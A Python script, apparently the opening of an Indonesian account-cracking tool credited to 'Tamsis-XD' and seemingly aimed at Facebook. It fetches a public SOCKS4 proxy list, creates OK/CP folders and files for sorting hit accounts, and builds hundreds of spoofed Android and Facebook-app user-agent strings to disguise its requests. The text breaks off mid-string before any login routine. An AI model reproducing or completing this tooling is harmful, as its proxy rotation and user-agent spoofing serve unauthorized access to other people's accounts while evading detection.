#######################Boleh Recode,Jangan Nyomot Dan Jangan Hapus Nama Gw#######################Tamsis
import requests,re,time,os,sys,rich,random,datetime,bs4,string
from requests import get as Tamsis
from bs4 import BeautifulSoup as sup
from time import sleep as bobo
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from os import system as termux
from rich.panel import Panel as pnl
open("DUMP.txt","a").write(f'\n');
termux('clear')
umur=[]
cok=[]
token=[]
uaa=[]
metode=[]
loop=0
try:os.mkdir('tamsisOK');os.mkdir('tamsisCP')
except:pass
sys.stdout.write('\x1b]2; Tamsis-XD \x07')
cp=0
ok=0
id=[]
uid=[]
tg = datetime.datetime.now().day
bl = datetime.datetime.now().month
th = datetime.datetime.now().year
svo = 'OK-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
svc = 'CP-'+str(tg)+'-'+str(bl)+'-'+str(th)+'.txt'
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('pxy.txt','w').write(proxylist)
except Exception as e:
	print('Nyalain data Suhu')
	exit()
bro=open('pxy.txt','r').read().splitlines()
limitd=0
for agenkuw in range(100):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2109'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2089'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 11; '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='J8_EEA)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Safari/537.36'
	uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku2)	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='SM-A536B Build/SP1A.210812.016; wv) '
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 '
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 11;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='es-mx; ZTE 8045 Build/RP1A.201005.001; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/108.0.5359.61'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 MMS/ZTE-Android- MMS-V2.0'
	uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku2)	
	a='Mozilla/5.0 (Linux; Android 12; '
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH2127 Build/RKQ1.211119.001; wv) '
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/113.0.5672.76 '
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 JsSdk/2 NewsArticle/8.1.7 NetType/wifi'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)	
	a='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH1809 Build/OPM1.171019.026; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/108.0.5359.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Seluler Safari/537.36 [FB_IAB/Orca-Android;FBAV/ 396.0.0.14.82;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Infinix X670 Build/SP1A.210812.016; wv)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uaku)	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0''6.0','7.0','8.1.0','9','10','11','12'])
	c='Infinix X689)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0''6.0','7.0','8.1.0','9','10','11','12'])
	c='vivo 1820 Build/O11019; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36 VivoBrowser/9.8.2.0'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c='Lenovo A7700 Build/MRA58K)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0'])
	c='SM-G532M Build/MMB29T; wv) '
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='CPH2071 Build/PPR1.180610.011; wv) '
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]'
	uaku=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c='Redmi Note 8)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c='Infinix X6511B)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(73,100)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uaku=(f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}')
	uaa.append(uaku)
	aa='Mozilla/5.0 (Linux; Android 11.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='TVBOX-5G) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 '
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='CPH2273 Build/TP1A.220905.001; wv) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.170'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/412.0.0.22.115;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 10; '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['moto e(7) plus Build/QPZS30.30-Q3-38-69-12; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/353.0.0.5.112;FBDM/DisplayMetrics'+'{density=1.75, width=720, height=1473, scaledDensity=1.75, xdpi=268.941, ydpi=269.139};]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['zh-cn; Redmi 5 Plus Build/N2G47H)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; ru-ru)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='9; CPH1825)P259E)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.77.0.4152.48.4264.57'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='CPH1825)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.4152.48'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 9;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SM-J120H Build/PKQ1.130176.001; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.5510.79'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='en-us; OPPO PBBT30 Build/OPM1.171019.026)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/53.0.2785.134'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 OppoBrowser/4.7. 9'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='PBAM00 Build/OPM1.171019.026; wv)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/109.0.5414.117'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Seluler Safari/537.36 [FB_IAB/FB4A;FBAV/391.1. 0.37.104;]'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android'
	b=random.choice(['2.3.6;','4.0.4;','4.2.1;','4.2.2;','4.3;','4.4.2;','4.4.4;','5.0;','5.0.2;','5.1;','5.1.1;','6.0;','6;','6.0.1;','7.0.1;','7;','8;','8.0;','5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['meizu C9 Build/OPM2.171019.012; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	a='Mozilla/5.0 (Linux; Android 10;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='CPH2239)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/87.0.4280.101 Mobile Safari/537.36'
	uakuh=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	uaa.append(uakuh)
	a='Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='Linux; Android 7.1.2; Redmi 4A)'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/E7FBAF'
	uaku2=(f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='it-it; Redmi 5 Plus Build/OPM1.171019.019) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.9.8-g'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0;'
	b=random.choice(['4.3','5.0','7.0','8.1.0','9','10','11','12','13'])
	c='Redmi 5 Plus Build/OPM1.171019.019) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.85'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 7.1.2; '
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Redmi 5 Plus Build/N2G47H; ru-ru)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 '
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['zh-cn; Redmi 5 Plus Build/N2G47H) '])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	uaa.append(uaku2)
	aa='Mozilla/5.0 (Linux; Android 8.1.0; '
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Redmi 5 Plus Build/OPM1.171019.019; ru-ru)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Puffin/9.7.2.51367AP'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	uaa.append(uaku2)
	aa='Mozilla/5.0 (X11;'
